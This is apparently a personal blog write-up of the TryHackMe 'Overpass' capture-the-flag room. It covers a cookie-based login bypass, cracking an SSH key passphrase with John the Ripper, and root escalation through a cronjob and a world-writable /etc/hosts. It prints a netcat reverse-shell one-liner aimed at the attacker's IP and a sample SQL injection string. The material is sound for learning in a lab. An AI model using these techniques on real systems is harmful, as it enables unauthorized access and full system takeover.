**CTF Name**: [Overpass](https://tryhackme.com/r/room/overpass){:target="_blank"}  
**Description**: What happens when some broke CompSci students make a password manager?  
**Categories**: Linux, Web Application, OWASP Top 10, Privilege Escalation  
**Difficulty**: Easy  

Let's begin with the usual enumeration. Scanning the target with **nmap** reveals that it is exposing something on port **80**.

{:refdef: style="text-align: center;"}
[![Nmap scan](/assets/overpass/1_nmap.png)](/assets/overpass/1_nmap.png){:target="_blank"}
{:refdef}

While nmap finishes its job, let's visit the target with a browser to take a look at the website it is serving.

{:refdef: style="text-align: center;"}
[![Website](/assets/overpass/2_website.png)](/assets/overpass/2_website.png){:target="_blank"}
{:refdef}

Scanning the website with **gobuster** reveals an interesting directory, **/admin**.

On this page we can see a login form. There are several ways to break login forms, but many seem unfeasible. Default insecure credentials such as **admin:admin**, **admin:password**, or **admin:123456** do not seem to work. Trying to bypass the authentication form with **SQL Injection** (by inserting **' OR 1 = 1;--** in either field) does not seem to work either. **Cross Site Scripting** also seems unfeasible.

Going back to inspect the default page's code, nothing useful can be found (except for a funny comment).

Switching to the console tab, however, displays a "Hello World" message. Have the developers forgot to remove some test code? Or perhaps some code may be revealing information about our target.

{:refdef: style="text-align: center;"}
[![Console](/assets/overpass/5_console.png)](/assets/overpass/5_console.png){:target="_blank"}
{:refdef}

Going back to **/admin** we can notice that not only does this happen again, but when observing the downloaded JavaScript code there are two more files that may be of interest.

{:refdef: style="text-align: center;"}
[![JavaScript files](/assets/overpass/6_js_files.png)](/assets/overpass/6_js_files.png){:target="_blank"}
{:refdef}

The file responsible for the "Hello World" message is **main.js**, which only does this. The **cookie.js** file seems like a one-liner that defines a custom cookie, while the **login.js** file seems more of interest.

Inspecting this file reveals that the **login()** function that handles the login process is expecting a response from the API. This response is either "**Incorrect credentials**", or a value for a cookie that has "**SessionToken**" as key. We could try setting this cookie's value to something specific, hoping that it is enough to bypass the login form.

{:refdef: style="text-align: center;"}
[![Login form](/assets/overpass/7_login_js.png)](/assets/overpass/7_login_js.png){:target="_blank"}
{:refdef}

Running **Cookies.set("SessionToken", "admin")** in the console will set the value for "**SessionToken**" to be "**admin**".

**Note**: you may have to enable pasting commands into the console by following the instructions provided by your browser. Some browsers require this as a form of prevention.

{:refdef}

Now refreshing the page will let us in as the website is not managing authentication properly. We can see the cookie we just set, and also the administrator dashboard.

Here we meet some interesting information: we get to know that **James** is a user that can log in via **SSH**, and we even get his **private SSH key**.

{:refdef: style="text-align: center;"}
[![Private SSH key](/assets/overpass/10_private_key.png)](/assets/overpass/10_private_key.png){:target="_blank"}
{:refdef}

After copying this key into a file and changing its permissions with **chmod 400 KEYFILE** (to avoid the "**Unprotected private key file!**" error) we can finally try SSHing into the target machine, but we will be met by a prompt asking for a **passphrase**. We still cannot use this private key as it has to be decrypted (as the page and the key's header themselves were also telling us).

{:refdef: style="text-align: center;"}
[![Passphrase requested](/assets/overpass/11_passphrase.png)](/assets/overpass/11_passphrase.png){:target="_blank"}
{:refdef}

Before actually cracking this key we have to transform it into a suitable format. Running **ssh2john KEYFILE > HASHFILE** will output a crackable hash into the file **HASHFILE**.

**Note**: if you are not running Kali Linux (or if you are using an older version) you may have to install this tool. To do so, simply download it with

{% highlight bash %}
curl https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py -o ssh2john.py
{% endhighlight %}

and then run **python3 ssh2john KEYFILE > HASHFILE**.

[![Converting the encrypted private key](/assets/overpass/12_ssh2john.png)](/assets/overpass/12_ssh2john.png){:target="_blank"}
{:refdef}

We can now crack this hash with **sudo john HASHFILE -w=/usr/share/wordlists/rockyou.txt**.

It won't take long before James' passphrase is in our hands.

{:refdef}

We can now SSH into the target machine.

Exploring the **/home** directory (James' directory in particular) we can find the **user.txt** file which contains the first flag of this challenge.

{:refdef: style="text-align: center;"}
[![User flag](/assets/overpass/14_user_flag.png)](/assets/overpass/14_user_flag.png){:target="_blank"}
{:refdef}

There is another file in this directory, **todo.txt**, which may be of interest. As a matter of fact, reading this file we learn that there is an automated build script running somewhere. Let's see... if there are any **cronjobs** that run this script by reading **/etc/crontab**...

Indeed, there is a cronjob that downloads a script and then runs it in bash... with **root privileges**! This actually happens every minute.

{:refdef: style="text-align: center;"}
[![Crontab](/assets/overpass/15_crontab.png)](/assets/overpass/15_crontab.png){:target="_blank"}
{:refdef}

Since this script is downloaded and ran as **root**, we could easily provide a malicious script to escalate our privileges. We do not have control over the machine that serves this file, but if we had **write access** to the **/etc/hosts** file we could create an entry that would resolve to a server we can actually control. The malicious server will then serve a script which would get executed as root on our target machine.

Running **ls -l /etc/hosts** we can see that it is indeed **world-writable**.

{:refdef: style="text-align: center;"}
[![Hosts file](/assets/overpass/16_etc_hosts.png)](/assets/overpass/16_etc_hosts.png){:target="_blank"}
{:refdef}

Reading it we can see that there is an entry for **overpass.thm** already, so let's comment it out and add our own entry. Our entry will resolve to the IP address of our attacking machine. From now on, each request done on **overpass.thm** will be sent to our own machine.

We still have to create our own malicious script, so let's create a path that is similar to the one queried by the cronjob on our machine. From a comfortable directory in our attacking machine (which is **~/TryHackMe/Overpass** for me), we can run **mkdir downloads/** and **mkdir downloads/src/** to create the appropriate path, while **touch downloads/src/buildscript.sh** will create the file.

Before editing this file, let's go back to the target machine and verify that **netcat** is installed and that it supports the **-e** flag.

{:refdef: style="text-align: center;"}
[![Checking that netcat supports an appropriate flag](/assets/overpass/17_netcat.png)](/assets/overpass/17_netcat.png){:target="_blank"}
{:refdef}

Unfortunately it doesn't, but that won't stop us!

Let's go back to our machine and edit the newly created script to open a reverse shell to our own machine with the following one-liner:

{% highlight bash %}
/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP_ADDRESS PORT >/tmp/f
{% endhighlight %}

Remember to use your own IP address and a port number of your choice.

{:refdef}

Now let’s run a listener on our attacking machine with **nc -lvnp 4444** and make our home directory available by running **python -m http.server 80** (this runs a **HTTP server** on port **80**) in another terminal window, and in less than a minute we should receive a connection from the target machine.

Normally we would be interested in converting this shell to a fully interactive shell, but as the objective - the **root flag** - is right around the corner we can just reach it this way.

If you’re interested in converting this shell in a fully interactive one, you can read how to in my previous writeup, [LazyAdmin]({% link portfolio/_posts/2024-08-19-Lazy-Admin.markdown %})!
